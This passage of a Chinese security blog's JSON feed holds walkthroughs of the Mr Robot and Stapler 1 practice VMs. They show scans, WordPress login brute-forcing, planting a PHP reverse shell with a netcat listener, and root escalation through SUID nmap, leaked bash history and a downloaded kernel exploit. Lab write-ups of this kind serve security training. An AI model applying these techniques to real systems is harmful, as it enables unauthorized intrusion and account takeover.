          "name": "lhz"
        }
      ],
      "tags": [
        "渗透"
      ]
    },
    {
      "title": "靶机 MrRobots Walkthrough",
      "url": "http://www.liuhanzhe.com/docs/security/%E9%9D%B6%E6%9C%BA/MrRobots/",
      "id": "http://www.liuhanzhe.com/docs/security/%E9%9D%B6%E6%9C%BA/MrRobots/",
      "content_html": "<p>靶机介绍</p>\n<div><pre><code>Description\nBack to the Top\nBased on the show, Mr. Robot.\n\nThis VM has three keys hidden in different locations. Your goal is to find all three. Each key is progressively difficult to find.\n\nThe VM isn&#39;t too difficult. There isn&#39;t any advanced exploitation or reverse engineering. The level is considered beginner-intermediate.\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div><p>nmap发现IP</p>\n<div><pre><code>┌──(root㉿kali)-[/home/kali]\n└─# nmap -sP 192.168.182.0/24\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-04-02 05:58 EDT\nNmap scan report for 192.168.182.1\nHost is up (0.00046s latency).\nMAC Address: 00:50:56:C0:00:08 (VMware)\nNmap scan report for 192.168.182.2\nHost is up (0.00037s latency).\nMAC Address: 00:50:56:EF:50:5D (VMware)\nNmap scan report for 192.168.182.130\nHost is up (0.00037s latency).\nMAC Address: 00:0C:29:C9:23:94 (VMware)\nNmap scan report for 192.168.182.254\nHost is up (0.00020s latency).\nMAC Address: 00:50:56:E9:D6:FF (VMware)\nNmap scan report for 192.168.182.128\nHost is up.\nNmap done: 256 IP addresses (5 hosts up) scanned in 3.20 seconds\n\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br></div></div><p>nmap扫描目标</p>\n<div><pre><code>┌──(root㉿kali)-[/home/kali]\n└─# nmap -T5 -A -v -p- 192.168.182.130\nStarting Nmap 7.92 ( https://nmap.org ) at 2022-04-02 05:58 EDT\nNSE: Loaded 155 scripts for scanning.\nNSE: Script Pre-scanning.\nInitiating NSE at 05:58\nCompleted NSE at 05:58, 0.00s elapsed\nInitiating NSE at 05:58\nCompleted NSE at 05:58, 0.00s elapsed\nInitiating NSE at 05:58\nCompleted NSE at 05:58, 0.00s elapsed\nInitiating ARP Ping Scan at 05:58\nScanning 192.168.182.130 [1 port]\nCompleted ARP Ping Scan at 05:58, 0.06s elapsed (1 total hosts)\nInitiating Parallel DNS resolution of 1 host. at 05:58\nCompleted Parallel DNS resolution of 1 host. at 05:58, 0.00s elapsed\nInitiating SYN Stealth Scan at 05:58\nScanning 192.168.182.130 [65535 ports]\nDiscovered open port 80/tcp on 192.168.182.130\nDiscovered open port 443/tcp on 192.168.182.130\nSYN Stealth Scan Timing: About 45.18% done; ETC: 06:00 (0:00:38 remaining)\nCompleted SYN Stealth Scan at 05:59, 53.93s elapsed (65535 total ports)\nInitiating Service scan at 05:59\nScanning 2 services on 192.168.182.130\nCompleted Service scan at 06:00, 12.04s elapsed (2 services on 1 host)\nInitiating OS detection (try #1) against 192.168.182.130\nadjust_timeouts2: packet supposedly had rtt of -178034 microseconds.  Ignoring time.\nadjust_timeouts2: packet supposedly had rtt of -178034 microseconds.  Ignoring time.\nNSE: Script scanning 192.168.182.130.\nInitiating NSE at 06:00\nCompleted NSE at 06:00, 0.42s elapsed\nInitiating NSE at 06:00\nCompleted NSE at 06:00, 0.03s elapsed\nInitiating NSE at 06:00\nCompleted NSE at 06:00, 0.00s elapsed\nNmap scan report for 192.168.182.130\nHost is up (0.00030s latency).\nNot shown: 65532 filtered tcp ports (no-response)\nPORT    STATE  SERVICE  VERSION\n22/tcp  closed ssh\n80/tcp  open   http     Apache httpd\n|_http-title: Site doesn&#39;t have a title (text/html).\n|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-server-header: Apache\n443/tcp open   ssl/http Apache httpd\n|_http-title: Site doesn&#39;t have a title (text/html).\n|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n| ssl-cert: Subject: commonName=www.example.com\n| Issuer: commonName=www.example.com\n| Public Key type: rsa\n| Public Key bits: 1024\n| Signature Algorithm: sha1WithRSAEncryption\n| Not valid before: 2015-09-16T10:45:03\n| Not valid after:  2025-09-13T10:45:03\n| MD5:   3c16 3b19 87c3 42ad 6634 c1c9 d0aa fb97\n|_SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b\n|_http-server-header: Apache\nMAC Address: 00:0C:29:C9:23:94 (VMware)\nDevice type: general purpose\nRunning: Linux 3.X|4.X\nOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4\nOS details: Linux 3.10 - 4.11\nUptime guess: 198.047 days (since Thu Sep 16 04:52:50 2021)\nNetwork Distance: 1 hop\nTCP Sequence Prediction: Difficulty=257 (Good luck!)\nIP ID Sequence Generation: All zeros\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.30 ms 192.168.182.130\n\nNSE: Script Post-scanning.\nInitiating NSE at 06:00\nCompleted NSE at 06:00, 0.00s elapsed\nInitiating NSE at 06:00\nCompleted NSE at 06:00, 0.00s elapsed\nInitiating NSE at 06:00\nCompleted NSE at 06:00, 0.00s elapsed\nRead data files from: /usr/bin/../share/nmap\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 68.68 seconds\n           Raw packets sent: 131145 (5.772MB) | Rcvd: 5483 (1.856MB)\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br></div></div><p>nikto扫描</p>\n<div><pre><code>┌──(kali㉿kali)-[~]\n└─$ nikto -host 192.168.182.130\n- Nikto v2.1.6\n---------------------------------------------------------------------------\n+ Target IP:          192.168.182.130\n+ Target Hostname:    192.168.182.130\n+ Target Port:        80\n+ Start Time:         2022-04-02 05:59:28 (GMT-4)\n---------------------------------------------------------------------------\n+ Server: Apache\n+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS\n+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type\n+ Retrieved x-powered-by header: PHP/5.5.29\n+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)\n+ Uncommon header &#39;tcn&#39; found, with contents: list\n+ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for &#39;index&#39; were found: index.html, index.php                                                                          \n+ OSVDB-3092: /admin/: This might be interesting...                                                    \n+ Uncommon header &#39;link&#39; found, with contents: &lt;http://192.168.182.130/?p=23&gt;; rel=shortlink           \n+ /wp-links-opml.php: This WordPress script reveals the installed version.                             \n+ OSVDB-3092: /license.txt: License file found may identify site software.                             \n+ /admin/index.html: Admin login page/section found.                                                   \n+ Cookie wordpress_test_cookie created without the httponly flag                                       \n+ /wp-login/: Admin login page/section found.                                                          \n+ /wordpress: A Wordpress installation was found.                                                      \n+ /wp-admin/wp-login.php: Wordpress login found                                                        \n+ /wordpresswp-admin/wp-login.php: Wordpress login found                                               \n+ /blog/wp-login.php: Wordpress login found                                                            \n+ /wp-login.php: Wordpress login found                                                                 \n+ /wordpresswp-login.php: Wordpress login found                                                        \n+ 7915 requests: 0 error(s) and 18 item(s) reported on remote host                                     \n+ End Time:           2022-04-02 06:01:56 (GMT-4) (148 seconds)                                        \n---------------------------------------------------------------------------                            \n+ 1 host(s) tested                                                 \n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br></div></div><p>发现目标运行有web服务，且运行的是wordpress</p>\n<p>在robot.txt中发现2个文件</p>\n<p><img src=\"/assets/img/image-20220421172947591.png\" alt=\"image-20220421172947591\" /></p>\n<p>key-1-of-3.txt</p>\n<p><img src=\"/assets/img/image-20220421172952627.png\" alt=\"image-20220421172952627\" /></p>\n<p>有3部分key，这是第一部分</p>\n<p>访问fsocity.dic，下载文件后查看内容，很多内容，应该是一个字典</p>\n<p><img src=\"/assets/img/image-20220421172957634.png\" alt=\"image-20220421172957634\" /></p>\n<p>先对字典去重</p>\n<div><pre><code>cat fsocity.dic|sort -u &gt;fs.dic \n</code></pre>\n<div><span>1</span><br></div></div><p>下来使用生成的字典爆破，先爆破账号，在登录界面https://192.168.182.130/wp-admin 发现有找回密码功能，输入账号后明确返回了账号是否存在，使用这个功能来爆破账号</p>\n<p><img src=\"/assets/img/image-20220421173006050.png\" alt=\"image-20220421173006050\" /></p>\n<p>爆破成功，获得账号 elliot</p>\n<p><img src=\"/assets/img/image-20220421173011863.png\" alt=\"image-20220421173011863\" /></p>\n<p>再去登录页面爆破密码</p>\n<p><img src=\"/assets/img/image-20220421173017142.png\" alt=\"image-20220421173017142\" /></p>\n<p>爆破获得密码ER28-0652</p>\n<p><img src=\"/assets/img/image-20220421173022151.png\" alt=\"image-20220421173022151\" /></p>\n<p>使用elloit/ER2-0652登录，下来可用主题、插件方式获得shell，我们选择主题方式，直接修改404页面内容为php反弹shell</p>\n<p><img src=\"/assets/img/image-20220421173029742.png\" alt=\"image-20220421173029742\" /></p>\n<p>本地使用nc监听4444端口</p>\n<p><code>nc -nvlp 4444</code></p>\n<p>访问404页面，触发反弹shell <code>https://192.168.182.130/wp-admin/404.php</code></p>\n<p><img src=\"/assets/img/image-20220421173035619.png\" alt=\"image-20220421173035619\" /></p>\n<p>在/home/robot下，发现key2,但是没有权限访问，访问另个一文件<code>password.raw-md5</code>，应该是robot账号的密码，md5解密得到密码</p>\n<p><img src=\"/assets/img/image-20220421173044684.png\" alt=\"image-20220421173044684\" /></p>\n<p><img src=\"/assets/img/image-20220421173049635.png\" alt=\"image-20220421173049635\" /></p>\n<p>切换到robot用户，这里需要先获得tty</p>\n<p><code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)' export TERM=xterm</code></p>\n<p><img src=\"/assets/img/image-20220421173056882.png\" alt=\"image-20220421173056882\" /></p>\n<p>切换成功后可以查看文件内容</p>\n<p>按照常规套路，最后一个key需要获得root权限查看</p>\n<p>使用<code>find / -perm -u=s 2&gt;/dev/null</code> 查看有suid的命令</p>\n<p><img src=\"/assets/img/image-20220421173101929.png\" alt=\"image-20220421173101929\" /></p>\n<p>发现nmap，可以用来提权，先查看版本，5.20之前</p>\n<p><img src=\"/assets/img/image-20220421173107321.png\" alt=\"image-20220421173107321\" /></p>\n<p>使用</p>\n<p><code>nmap --interactive !sh</code></p>\n<p>提权</p>\n<p><img src=\"/assets/img/image-20220421173112288.png\" alt=\"image-20220421173112288\" /></p>\n<p>提权成功，在/root/下获得key</p>\n<p>完成</p>\n",
      "image": "http://www.liuhanzhe.com/assets/img/image-20220421172947591.png",
      "date_published": "2022-03-28T00:00:00.000Z",
      "date_modified": "2022-04-21T09:36:50.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "渗透"
      ]
    },
    {
      "title": "靶机 Stapler 1 Walkthrough",
      "url": "http://www.liuhanzhe.com/docs/security/%E9%9D%B6%E6%9C%BA/Stapler_1/",
      "id": "http://www.liuhanzhe.com/docs/security/%E9%9D%B6%E6%9C%BA/Stapler_1/",
      "content_html": "<h2 id=\"_0x01-扫描\"> 0x01 扫描</h2>\n<p>首先扫描靶机ip</p>\n<p><img src=\"/assets/img/image-20220421173254135.png\" alt=\"image-20220421173254135\" /></p>\n<p>发现靶机ip <code>192.168.56.101</code></p>\n<p>进一步扫描 <code>nmap -T5 -A -v -p- 192.168.56.101</code></p>\n<div><pre><code>┌──<span>(</span>kali㉿kali<span>)</span>-<span>[</span>~<span>]</span>\n└─$ nmap -T5 -A -v -p- <span>192.168</span>.56.101\nStarting Nmap <span>7.92</span> <span>(</span> https://nmap.org <span>)</span> at <span>2022</span>-03-02 03:27 EST\nNSE: Loaded <span>155</span> scripts <span>for</span> scanning.\nNSE: Script Pre-scanning.\nInitiating NSE at 03:27\nCompleted NSE at 03:27, <span>0</span>.00s elapsed\nInitiating NSE at 03:27\nCompleted NSE at 03:27, <span>0</span>.00s elapsed\nInitiating NSE at 03:27\nCompleted NSE at 03:27, <span>0</span>.00s elapsed\nInitiating Ping Scan at 03:27\nScanning <span>192.168</span>.56.101 <span>[</span><span>2</span> ports<span>]</span>\nCompleted Ping Scan at 03:27, <span>0</span>.00s elapsed <span>(</span><span>1</span> total hosts<span>)</span>\nmass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers\nInitiating Connect Scan at 03:27\nScanning <span>192.168</span>.56.101 <span>[</span><span>65535</span> ports<span>]</span>\nDiscovered <span>open</span> port <span>3306</span>/tcp on <span>192.168</span>.56.101\nDiscovered <span>open</span> port <span>139</span>/tcp on <span>192.168</span>.56.101\nDiscovered <span>open</span> port <span>22</span>/tcp on <span>192.168</span>.56.101\nDiscovered <span>open</span> port <span>80</span>/tcp on <span>192.168</span>.56.101\nDiscovered <span>open</span> port <span>53</span>/tcp on <span>192.168</span>.56.101\nDiscovered <span>open</span> port <span>21</span>/tcp on <span>192.168</span>.56.101\nConnect Scan Timing: About <span>46.58</span>% <span>done</span><span>;</span> ETC: 03:28 <span>(</span><span>0</span>:00:36 remaining<span>)</span>\nDiscovered <span>open</span> port <span>12380</span>/tcp on <span>192.168</span>.56.101\nDiscovered <span>open</span> port <span>666</span>/tcp on <span>192.168</span>.56.101\nCompleted Connect Scan at 03:28, <span>53</span>.02s elapsed <span>(</span><span>65535</span> total ports<span>)</span>\nInitiating Service scan at 03:28\nScanning <span>8</span> services on <span>192.168</span>.56.101\nCompleted Service scan at 03:28, <span>11</span>.06s elapsed <span>(</span><span>8</span> services on <span>1</span> <span>host</span><span>)</span>\nNSE: Script scanning <span>192.168</span>.56.101.\nInitiating NSE at 03:28\nNSE: <span>[</span>ftp-bounce<span>]</span> Couldn<span>'t resolve scanme.nmap.org, scanning 10.0.0.1 instead.\nNSE: [ftp-bounce] PORT response: 500 Illegal PORT command.\nCompleted NSE at 03:29, 30.87s elapsed\nInitiating NSE at 03:29\nCompleted NSE at 03:29, 0.03s elapsed\nInitiating NSE at 03:29\nCompleted NSE at 03:29, 0.00s elapsed\nNmap scan report for 192.168.56.101\nHost is up (0.00043s latency).\nNot shown: 65523 filtered tcp ports (no-response)\nPORT      STATE  SERVICE     VERSION\n20/tcp    closed ftp-data\n21/tcp    open   ftp         vsftpd 2.0.8 or later\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_Can'</span>t get directory listing: PASV failed: <span>550</span> Permission denied.\n<span>|</span> ftp-syst: \n<span>|</span>   STAT: \n<span>|</span> FTP server status:\n<span>|</span>      Connected to <span>192.168</span>.56.102\n<span>|</span>      Logged <span>in</span> as <span>ftp</span>\n<span>|</span>      TYPE: ASCII\n<span>|</span>      No session bandwidth limit\n<span>|</span>      Session <span>timeout</span> <span>in</span> seconds is <span>300</span>\n<span>|</span>      Control connection is plain text\n<span>|</span>      Data connections will be plain text\n<span>|</span>      At session startup, client count was <span>3</span>\n<span>|</span>      vsFTPd <span>3.0</span>.3 - secure, fast, stable\n<span>|</span>_End of status\n<span>22</span>/tcp    <span>open</span>   <span>ssh</span>         OpenSSH <span>7</span>.2p2 Ubuntu <span>4</span> <span>(</span>Ubuntu Linux<span>;</span> protocol <span>2.0</span><span>)</span>\n<span>|</span> ssh-hostkey: \n<span>|</span>   <span>2048</span> <span>81</span>:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 <span>(</span>RSA<span>)</span>\n<span>|</span>   <span>256</span> 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e <span>(</span>ECDSA<span>)</span>\n<span>|</span>_  <span>256</span> 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 <span>(</span>ED25519<span>)</span>\n<span>53</span>/tcp    <span>open</span>   domain      dnsmasq <span>2.75</span>\n<span>|</span> dns-nsid: \n<span>|</span>_  bind.version: dnsmasq-2.75\n<span>80</span>/tcp    <span>open</span>   http        PHP cli server <span>5.5</span> or later\n<span>|</span>_http-title: <span>404</span> Not Found\n<span>|</span> http-methods: \n<span>|</span>_  Supported Methods: GET HEAD POST OPTIONS\n<span>123</span>/tcp   closed ntp\n<span>137</span>/tcp   closed netbios-ns\n<span>138</span>/tcp   closed netbios-dgm\n<span>139</span>/tcp   <span>open</span>   netbios-ssn Samba smbd <span>4.3</span>.9-Ubuntu <span>(</span>workgroup: WORKGROUP<span>)</span>\n<span>666</span>/tcp   <span>open</span>   tcpwrapped\n<span>3306</span>/tcp  <span>open</span>   mysql       MySQL <span>5.7</span>.12-0ubuntu1\n<span>|</span> mysql-info: \n<span>|</span>   Protocol: <span>10</span>\n<span>|</span>   Version: <span>5.7</span>.12-0ubuntu1\n<span>|</span>   Thread ID: <span>9</span>\n<span>|</span>   Capabilities flags: <span>63487</span>\n<span>|</span>   Some Capabilities: Speaks41ProtocolNew, LongPassword, ConnectWithDatabase, SupportsCompression, Speaks41ProtocolOld, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, SupportsTransactions, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, FoundRows, InteractiveClient, ODBCClient, LongColumnFlag, Support41Auth, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments\n<span>|</span>   Status: Autocommit\n<span>|</span>   Salt: <span>(</span>V<span>\\</span>x7F<span>\\</span>x05uR.0<span>\\</span>x08<span>#n1W</span>\n<span>|</span> +E<span>\\</span>x17-<span>\\</span>x04<span>\\</span>x19\n<span>|</span>_  Auth Plugin Name: mysql_native_password\n<span>12380</span>/tcp <span>open</span>   http        Apache httpd <span>2.4</span>.18 <span><span>((</span>Ubuntu<span>))</span></span>\n<span>|</span>_http-server-header: Apache/2.4.18 <span>(</span>Ubuntu<span>)</span>\n<span>|</span> http-methods: \n<span>|</span>_  Supported Methods: GET HEAD POST OPTIONS\n<span>|</span>_http-title: Tim, we need to-do better next year <span>for</span> Initech\nService Info: Host: RED<span>;</span> OS: Linux<span>;</span> CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n<span>|</span> smb2-time: \n<span>|</span>   date: <span>2022</span>-03-02T16:28:38\n<span>|</span>_  start_date: N/A\n<span>|</span>_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m57s\n<span>|</span> smb-os-discovery: \n<span>|</span>   OS: Windows <span>6.1</span> <span>(</span>Samba <span>4.3</span>.9-Ubuntu<span>)</span>\n<span>|</span>   Computer name: red\n<span>|</span>   NetBIOS computer name: RED<span>\\</span>x00\n<span>|</span>   Domain name: <span>\\</span>x00\n<span>|</span>   FQDN: red\n<span>|</span>_  System time: <span>2022</span>-03-02T16:28:38+00:00\n<span>|</span> smb-security-mode: \n<span>|</span>   account_used: guest\n<span>|</span>   authentication_level: user\n<span>|</span>   challenge_response: supported\n<span>|</span>_  message_signing: disabled <span>(</span>dangerous, but default<span>)</span>\n<span>|</span> smb2-security-mode: \n<span>|</span>   <span>3.1</span>.1: \n<span>|</span>_    Message signing enabled but not required\n<span>|</span> nbstat: NetBIOS name: RED, NetBIOS user: <span>&lt;</span>unknown<span>></span>, NetBIOS MAC: <span>&lt;</span>unknown<span>></span> <span>(</span>unknown<span>)</span>\n<span>|</span> Names:\n<span>|</span>   RED<span>&lt;</span><span>0</span><span><span>0</span>></span>              Flags: <span>&lt;</span>unique<span>></span><span>&lt;</span>active<span>></span>\n<span>|</span>   RED<span>&lt;</span><span>0</span><span><span>3</span>></span>              Flags: <span>&lt;</span>unique<span>></span><span>&lt;</span>active<span>></span>\n<span>|</span>   RED<span>&lt;</span><span>2</span><span><span>0</span>></span>              Flags: <span>&lt;</span>unique<span>></span><span>&lt;</span>active<span>></span>\n<span>|</span>   <span>\\</span>x01<span>\\</span>x02__MSBROWSE__<span>\\</span>x0<span><span>2</span>&lt;</span><span>0</span><span><span>1</span>></span>  Flags: <span>&lt;</span>group<span>></span><span>&lt;</span>active<span>></span>\n<span>|</span>   WORKGROUP<span>&lt;</span><span>0</span><span><span>0</span>></span>        Flags: <span>&lt;</span>group<span>></span><span>&lt;</span>active<span>></span>\n<span>|</span>   WORKGROUP<span>&lt;</span>1d<span>></span>        Flags: <span>&lt;</span>unique<span>></span><span>&lt;</span>active<span>></span>\n<span>|</span>_  WORKGROUP<span>&lt;</span>1e<span>></span>        Flags: <span>&lt;</span>group<span>></span><span>&lt;</span>active<span>></span>\n\nNSE: Script Post-scanning.\nInitiating NSE at 03:29\nCompleted NSE at 03:29, <span>0</span>.00s elapsed\nInitiating NSE at 03:29\nCompleted NSE at 03:29, <span>0</span>.00s elapsed\nInitiating NSE at 03:29\nCompleted NSE at 03:29, <span>0</span>.00s elapsed\nRead data files from: /usr/bin/<span>..</span>/share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ <span>.</span>\nNmap done: <span>1</span> IP address <span>(</span><span>1</span> <span>host</span> up<span>)</span> scanned <span>in</span> <span>95.52</span> seconds\n\n</code></pre>\n<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br><span>92</span><br><span>93</span><br><span>94</span><br><span>95</span><br><span>96</span><br><span>97</span><br><span>98</span><br><span>99</span><br><span>100</span><br><span>101</span><br><span>102</span><br><span>103</span><br><span>104</span><br><span>105</span><br><span>106</span><br><span>107</span><br><span>108</span><br><span>109</span><br><span>110</span><br><span>111</span><br><span>112</span><br><span>113</span><br><span>114</span><br><span>115</span><br><span>116</span><br><span>117</span><br><span>118</span><br><span>119</span><br><span>120</span><br><span>121</span><br><span>122</span><br><span>123</span><br><span>124</span><br><span>125</span><br><span>126</span><br><span>127</span><br><span>128</span><br><span>129</span><br><span>130</span><br><span>131</span><br><span>132</span><br><span>133</span><br><span>134</span><br><span>135</span><br><span>136</span><br></div></div><h2 id=\"_0x02-渗透\"> 0x02 渗透</h2>\n<p>发现80端口，尝试访问，没什么内容</p>\n<p><img src=\"/assets/img/image-20220421173305384.png\" alt=\"image-20220421173305384\" /></p>\n<p>12380端口运行的也是web服务，尝试访问，发现网页</p>\n<p><img src=\"/assets/img/image-20220421173309645.png\" alt=\"image-20220421173309645\" /></p>\n<p>使用nikto扫描</p>\n<p><img src=\"/assets/img/image-20220421173317372.png\" alt=\"image-20220421173317372\" /></p>\n<p>发现路径<code>/admin112233/</code>， <code>/blogblog/</code>，网站还使用了SSL，使用https访问发现路径</p>\n<p>访问https://192.168.56.101:12380/blogblog/后，发现是wordpress</p>\n<p><img src=\"/assets/img/image-20220421173323439.png\" alt=\"image-20220421173323439\" /></p>\n<p>使用wpscan扫描</p>\n<p><code>wpscan --url https://192.168.56.101:12380/blogblog/ --enumerate u --disable-tls-checks</code></p>\n<p><img src=\"/assets/img/image-20220421173328811.png\" alt=\"image-20220421173328811\" /></p>\n<p>尝试爆破用户密码</p>\n<p><code>wpscan --url https://192.168.56.101:12380/blogblog/ --usernames John Smith --passwords /usr/share/wordlists/rockyou.txt --disable-tls-checks</code></p>\n<p>爆破成功</p>\n<p><img src=\"/assets/img/image-20220421173335081.png\" alt=\"image-20220421173335081\" /></p>\n<p>使用账号密码登录，发现刚好是管理员</p>\n<p><code>设备问题，重装虚拟机后，靶机ip变为192.168.56.103</code></p>\n<p>访问靶机上传插件保存位置发现可以访问<code>https://192.168.56.103:12380/blogblog/wp-content/uploads/</code></p>\n<p>添加新插件，上传反弹shell，需要验证ftp，可以不继续操作，shell已经上传成功</p>\n<p><img src=\"/assets/img/image-20220421173341612.png\" alt=\"image-20220421173341612\" /></p>\n<p><img src=\"/assets/img/image-20220421173346277.png\" alt=\"image-20220421173346277\" /></p>\n<p>kali使用nc监听<code>nc -nlvp 4444</code>，反弹成功，拿到shell</p>\n<p><img src=\"/assets/img/image-20220421173351863.png\" alt=\"image-20220421173351863\" /></p>\n<p>当前用户<code>www-data</code>,下一步尝试提权</p>\n<h1 id=\"_0x03-提权\"> 0x03 提权</h1>\n<h2 id=\"提权1\"> 提权1</h2>\n<p>查看home下的文件，未发现特殊文件，查看shell历史命令<code>cat */.bash_history</code>，发现peter用户ssh密码</p>\n<p><img src=\"/assets/img/image-20220421173357083.png\" alt=\"image-20220421173357083\" /></p>\n<p>使用ssh连接</p>\n<p><img src=\"/assets/img/image-20220421173401990.png\" alt=\"image-20220421173401990\" /></p>\n<p>使用sudo -l发现peter拥有所有命令root权限，使用sudo -i，输入密码，获得root权限</p>\n<p><img src=\"/assets/img/image-20220421173407178.png\" alt=\"image-20220421173407178\" /></p>\n<h2 id=\"提权2\"> 提权2</h2>\n<p>查看Linux版本</p>\n<p><img src=\"/assets/img/image-20220421173412061.png\" alt=\"image-20220421173412061\" /></p>\n<p>根据版本搜索漏洞</p>\n<p><img src=\"/assets/img/image-20220421173418281.png\" alt=\"image-20220421173418281\" /></p>\n<p>使用39772提权</p>\n<p><img src=\"/assets/img/image-20220421173422671.png\" alt=\"image-20220421173422671\" /></p>\n<p>下载exp，启动http服务</p>\n<p><img src=\"/assets/img/image-20220421173427463.png\" alt=\"image-20220421173427463\" /></p>\n<p>靶机下载，编译运行exp，获得root权限</p>\n<p><img src=\"/assets/img/image-20220421173431729.png\" alt=\"image-20220421173431729\" /></p>\n<p><img src=\"/assets/img/image-20220421173438592.png\" alt=\"image-20220421173438592\" /></p>\n<p><img src=\"/assets/img/image-20220421173443305.png\" alt=\"image-20220421173443305\" /></p>\n",
      "image": "http://www.liuhanzhe.com/assets/img/image-20220421173254135.png",
      "date_published": "2022-04-02T00:00:00.000Z",
      "date_modified": "2022-04-21T10:42:28.000Z",
      "authors": [
        {
          "name": "lhz"
        }
      ],
      "tags": [
        "渗透"
      ]
    },
    {
      "title": "靶机 DC2-writeup",
      "url": "http://www.liuhanzhe.com/docs/security/%E9%9D%B6%E6%9C%BA/dc2/",
      "id": "http://www.liuhanzhe.com/docs/security/%E9%9D%B6%E6%9C%BA/dc2/",
